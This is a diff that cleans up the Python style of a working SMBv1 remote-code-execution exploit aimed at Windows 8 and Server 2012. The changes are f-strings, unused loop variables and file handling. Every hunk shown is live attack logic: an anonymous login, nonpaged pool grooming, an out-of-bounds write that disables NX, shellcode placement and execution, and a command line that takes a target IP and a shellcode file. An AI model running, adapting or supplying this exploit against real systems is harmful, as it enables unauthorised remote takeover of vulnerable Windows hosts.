@@ -374,16 +374,15 @@ def send_nt_trans(conn, tid, setup, data, param, firstDataFragmentSize, sendLast
 	else:
 		print('got bad NT Trans response: 0x{:x}'.format(recvPkt.getNTStatus()))
 		sys.exit(1)
-	
+
 	i = firstDataFragmentSize
 	while i < len(data):
 		sendSize = min(4096, len(data) - i)
-		if len(data) - i <= 4096:
-			if not sendLastChunk:
-				break
+		if len(data) - i <= 4096 and not sendLastChunk:
+			break
 		send_trans2_second(conn, tid, data[i:i+sendSize], i)
 		i += sendSize
-	
+
 	if sendLastChunk:
 		conn.recvSMB()
 	return i
@@ -417,7 +416,7 @@ def exploit(target, shellcode, numGroomConn):
 	# can use conn.login() for ntlmv2
 	conn.login_standard('', '')
 	server_os = conn.get_server_os()
-	print('Target OS: '+server_os)
+	print(f'Target OS: {server_os}')
 	if not (server_os.startswith("Windows 8") or server_os.startswith("Windows Server 2012 ")):
 		print('This exploit does not support this target')
 		sys.exit()
@@ -436,11 +435,11 @@ def exploit(target, shellcode, numGroomConn):
 	# create some big buffer at server
 	# this buffer MUST NOT be big enough for overflown buffer
 	allocConn = createSessionAllocNonPaged(target, NTFEA_SIZE - 0x2010)
-	
+
 	# groom nonpaged pool
 	# when many big nonpaged pool are allocated, allocate another big nonpaged pool should be next to the last one
 	srvnetConn = []
-	for i in range(numGroomConn):
+	for _ in range(numGroomConn):
 		sk = createConnectionWithBigSMBFirst80(target, for_nx=True)
 		srvnetConn.append(sk)
 
@@ -452,13 +451,13 @@ def exploit(target, shellcode, numGroomConn):
 	allocConn.get_socket().close()
 
 	# hope one of srvnetConn is next to holeConn
-	for i in range(5):
+	for _ in range(5):
 		sk = createConnectionWithBigSMBFirst80(target, for_nx=True)
 		srvnetConn.append(sk)
-		
+
 	# remove holeConn to create hole for fea buffer
 	holeConn.get_socket().close()
-	
+
 	# send last fragment to create buffer in hole and OOB write one of srvnetConn struct header
 	# first trigger to overwrite srvnet buffer struct for disabling NX
 	send_trans2_second(nxconn, nxtid, feaListNx[nxprogress:], nxprogress)
@@ -468,12 +467,12 @@ def exploit(target, shellcode, numGroomConn):
 		print('good response status for nx: INVALID_PARAMETER')
 	else:
 		print('bad response status for nx: 0x{:08x}'.format(retStatus))
-		
+
 	# one of srvnetConn struct header should be modified
 	# send '\x00' to disable nx
 	for sk in srvnetConn:
 		sk.send('\x00')
-	
+
 	# send last fragment to create buffer in hole and OOB write one of srvnetConn struct header
 	# second trigger to place fake struct and shellcode
 	send_trans2_second(conn, tid, feaList[progress:], progress)
@@ -492,7 +491,7 @@ def exploit(target, shellcode, numGroomConn):
 	# execute shellcode
 	for sk in srvnetConn:
 		sk.close()
-	
+
 	# nicely close connection (no need for exploit)
 	nxconn.disconnect_tree(tid)
 	nxconn.logoff()
@@ -503,16 +502,14 @@ def exploit(target, shellcode, numGroomConn):
 
 
 if len(sys.argv) < 3:
-	print("{} <ip> <shellcode_file> [numGroomConn]".format(sys.argv[0]))
+	print(f"{sys.argv[0]} <ip> <shellcode_file> [numGroomConn]")
 	sys.exit(1)
 
 TARGET=sys.argv[1]
 numGroomConn = 13 if len(sys.argv) < 4 else int(sys.argv[3])
 
-fp = open(sys.argv[2], 'rb')
-sc = fp.read()
-fp.close()
-
+with open(sys.argv[2], 'rb') as fp:
+	sc = fp.read()
 if len(sc) > 4096:
 	print('Shellcode too long. The place that this exploit put a shellcode is limited to 4096 bytes.')
 	sys.exit()
